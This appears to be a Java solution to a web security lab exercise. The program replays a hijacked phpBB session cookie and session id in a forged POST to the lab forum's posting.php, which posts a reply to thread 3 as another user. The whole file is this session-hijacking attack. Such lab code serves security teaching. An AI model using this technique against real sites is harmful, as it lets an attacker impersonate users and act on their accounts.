import java.io.*;
import java.net.*;

public class HTTPSimpleForce{
    public static void main (String[] args) throws IOException{
        try {
            int response_code;
            InputStream response_in = null;

            URL url = new URL("http://www.xsslabphpbb.com/posting.php");
            URLConnection url_conn = url.openConnection();
            if (url_conn instanceof HttpURLConnection){
                url_conn.setConnectTimeout(60000);
                url_conn.setReadTimeout(90000);
            }
            url_conn.addRequestProperty("User-agent", "Sun JDK 1.6");
            //Set the correct cookies
            url_conn.addRequestProperty("Cookie", "phpbb2mysql_t=a%3A3%3A%7Bi%3A5%3Bi%3A1385913838%3Bi%3A6%3Bi%3A1385913898%3Bi%3A7%3Bi%3A1385916300%3B%7D; phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D; phpbb2mysql_sid=32529427596948010be639ebc4c17adf");
            url_conn.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");


            //Add the data. Most of this is straight up copied from a legitimate HTML POST request, but a few pieces are
            //changed.
            String data = "subject=&addbbcode18=%23444444&addbbcode20=0&" +
                "helpbox=Font+color%3A+%5Bcolor%3Dred%5Dtext%5B%2Fcolor%5D++Tip%3A+you+can+also+use+color%3D%23FF0000" +
                "&message=Not+legit+any+more..." + //The reply to post
                "&mode=reply" + //Set the reply flag
                "&sid=32529427596948010be639ebc4c17adf" + //Hand over the valid cookie
                "&t=3" + //Specify that we want this reply to be posted to thread 3
                "&post=Submit";

            url_conn.addRequestProperty("Content-Length", ""+data.length());
            url_conn.setDoOutput(true);

            OutputStreamWriter wr = new OutputStreamWriter(url_conn.getOutputStream());

            wr.write(data);
            wr.flush();

            if(url_conn instanceof HttpURLConnection){
                HttpURLConnection http_conn = (HttpURLConnection) url_conn;

                response_code = http_conn.getResponseCode();
                System.out.println("Response code = " + response_code);

                if(response_code  == HttpURLConnection.HTTP_OK){
                    response_in = url_conn.getInputStream();
                    BufferedReader buf_inp = new BufferedReader(new InputStreamReader(response_in));
                    String input_line;
                    while((input_line = buf_inp.readLine())!=null){
                        System.out.println(input_line);
                    }
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
